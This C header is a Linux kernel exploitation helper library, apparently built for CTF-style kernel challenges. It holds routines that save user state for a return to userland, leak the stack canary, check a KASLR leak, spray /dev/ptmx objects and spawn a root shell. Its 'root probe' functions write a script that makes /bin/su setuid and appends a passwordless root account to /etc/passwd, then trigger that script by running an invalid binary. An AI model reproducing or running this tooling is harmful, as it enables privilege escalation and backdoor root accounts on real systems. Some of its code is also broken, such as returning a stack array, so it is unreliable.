#define _GNU_SOURCE
#pragma once

/* To shut the fuck up the compiler */
#pragma GCC diagnostic ignored "-Wformat"
#pragma GCC diagnostic ignored "-Wincompatible-pointer-types"
#pragma GCC diagnostic ignored "-Wint-conversion"
#pragma GCC diagnostic ignored "-Wreturn-local-addr"
#pragma GCC diagnostic ignored "-Wunused-result"

#include <assert.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "struct.h"

typedef uint64_t ui64;
typedef uint32_t ui32;
typedef uint16_t ui16;
typedef uint8_t  ui8;
typedef int64_t  i64;
typedef int32_t  i32;
typedef int16_t  i16;
typedef int8_t   i8;
typedef int      fd;       

#define MAX_LINE_LEN      256
#define TTY_SIZE          0x2B8
#define NEWLINE           puts("");
#define COLOR_RED         "\033[0;31m"
#define COLOR_GREEN       "\033[0;32m"
#define COLOR_YELLOW      "\033[0;33m"
#define COLOR_RESET       "\033[0m"

ui64 kbase;
i32  g_fd;
ui64 g_cookie;
ui64 g_user_cs;
ui64 g_user_ss;
ui64 g_user_sp;
ui64 g_user_rflags;
ui8  g_cookie_offset;
ui64 g_user_rip;

ui32 test_var;

void get_shell(void);
void open_dev(const char *device_path);
// void test(void);
void save_state(void);
void dump_impl(const char* var_name, const ui64 *leaks, ui32 count);
bool is_stack_cookie(const char *value_str);
ui64 *leak_stack_cookie(i32 fd, ui64 size);
void check_kaslr(ui64 addr);
void setup_root_probe(void);
void execute_root_probe(void);                                      

#define fatal(var) fatal_impl(#var, (ui64)(var))
#define DUMP(var, size) dump_impl(#var, (const ui64*)(var), size)
#define LOOP(n) for (int i = 0; i < n; i++)
#define test printf(COLOR_GREEN "\nTest %d\n" COLOR_RESET, test_var++);

#define leak(...) \
    print_leaks_impl(#__VA_ARGS__, __VA_ARGS__)

#define PTMX_SPRAY(n) \
    LOOP(n) { \
        ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY); \
        if (ptmx[i] == -1) fatal("ptmx"); \
    }
    
#define RESTORE                       \
    ch = g_user_cs;                   \
    ch = g_user_rflags;               \
    ch = g_user_sp;                   \
    ch = g_user_ss;

static void
print_leaks_impl(const char *names, ...) {
    va_list ap;
    va_start(ap, names);

    printf("\n%15s\n\n", "=LEAKS=");
    const char *p = names;
    while (*p) {
        char buf[64];
        int len = 0;

        while (*p && isspace((unsigned char)*p))
            p++;

        while (*p && *p != ',') {
            if (!isspace((unsigned char)*p) && len < (int)sizeof(buf)-1)
                buf[len++] = *p;
            p++;
        }
        buf[len] = '\0';

        if (*p == ',')
            p++;

        ui64 val = va_arg(ap, ui64);
        printf("%-10s: 0x%lx\n", buf, val);
    }

    NEWLINE
    va_end(ap);
}

static void
fatal_impl(const char *var_name, ui64 var_val)
{
    printf(COLOR_RED "Fatal on %s: 0x%lx\n" COLOR_RESET,
           var_name, var_val);
    exit(-1);
}

void
get_shell(void) {
    uid_t uid = getuid();
    if (uid == 0) {
        printf(COLOR_GREEN "[+] UID: %d, got root!\n\n" COLOR_RESET, uid);
    } else {
        printf(COLOR_RED "[!] UID: %d, we root-less :(!\n\n" COLOR_RESET, uid);
        exit(-1);
    }
    system("/bin/sh");
}

void
open_dev(const char *device_path) {
    g_fd = open(device_path, O_RDWR);
    if (g_fd < 0) {
        printf("[!] Failed to open %s\n", device_path);
        exit(-1);
    } else {
        printf("[+] Successfully opened %s\n", device_path);
    }
}

void
check_root(void) {
    uid_t uid = getuid();
    if (uid) {
        printf(COLOR_RED "Failed to get root" COLOR_RESET);
        exit(-1);
    } else {
        printf(COLOR_GREEN "Got root" COLOR_RESET);
    }
}

void
save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov g_user_cs, cs;"
        "mov g_user_ss, ss;"
        "mov g_user_sp, rsp;"
        "pushf;"
        "pop g_user_rflags;"
        ".att_syntax;"
    );
    uid_t id = getuid();
    printf("[*] Saved state, current uid: %d\n", id);
}

void
dump_impl(const char* var_name, const ui64 *leaks, ui32 count) {
    printf(COLOR_GREEN "\n\t[+] dump from %s:\n\n" COLOR_RESET, var_name);
    for (ui32 i = 0; (i * sizeof(ui64)) < count; i++) {
        uint64_t current_leak = leaks[i];
        char leak_str[99];
        sprintf(leak_str, "%#02lx", current_leak);
        printf("\t--> %d: %s + 0x%x\t: %s\n", i, var_name, (unsigned int)(sizeof(leaks[0]) * i), leak_str);
    }
    puts("");
}

bool
is_stack_cookie(const char *value_str) {
    uint8_t in_len = strlen(value_str);
    if (in_len < 18) {
        return false;
    }

    char prefix[7] = "0xffff\0";
    char suffix[3] = "00\0";
    return (
        (!strncmp(value_str, prefix, strlen(prefix) - 1) == 0) &&
        (strncmp(value_str + in_len - strlen(suffix), suffix, strlen(suffix) - 1) == 0)
    );
}

ui64*
leak_stack_cookie(i32 fd, ui64 size) {
    uint8_t sz = size / 8;
    uint64_t leak[sz];
    memset(leak, 0, sizeof(leak));
    printf("[*] Attempting to leak up to %zu bytes\n", sizeof(leak));
    ssize_t bytes_read = read(fd, leak, sizeof(leak));

    if (bytes_read <= 0) {
        perror("[!] Failed to read from device during leak attempt");
        exit(-1);
    }
    printf("[*] Read %zd bytes. Searching leak...\n", bytes_read);

    for (uint8_t i = 0; i < sz; i++) {
        if (i * sizeof(uint64_t) >= bytes_read) {
            break;
        }

        uint64_t current_leak = leak[i];
        char leak_str[99];
        sprintf(leak_str, "%#02lx", current_leak);
        printf("\t--> %d: leak + 0x%x\t: %s", i, (unsigned int)(sizeof(leak[0]) * i), leak_str);

        int printed_marker = 0;
        if (!g_cookie && is_stack_cookie(leak_str) && i > 2) {
            printf("\t<== stack canary\n");
            g_cookie_offset = i;
            g_cookie = current_leak;
            printed_marker = 1;
        }

        if (!printed_marker) {
            puts("");
        }
    }

    if (!g_cookie) {
        puts("[!] Failed to leak stack cookie!");
    } else {
        printf("[*] Found stack cookie: %#018lx at offset %d\n", g_cookie, g_cookie_offset);
    }

    return leak;
}

void
check_kaslr(ui64 addr) {
    if ( (addr >> 0x28) ^ (0xFFFFFF) ) {
        puts("[!] Failed to get kgaslr leak");
        exit(-1);
    }
}

void
setup_root_probe(void) {
    system(
        "echo -e \""
        "#!/bin/sh\n"
        "chown root:root /bin/su\n"
        "chmod u+s /bin/su\n"
        "echo 'luna::0:0:root:/:/bin/sh' >> /etc/passwd\n"
        "\" > /tmp/x"
    );
    system("chmod +x /tmp/x");
}

void
execute_root_probe(void) {
    system("echo -e '\xFF\xFF\xFF\xFF' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");
    system("su luna; /bin/sh");
    exit(0);
}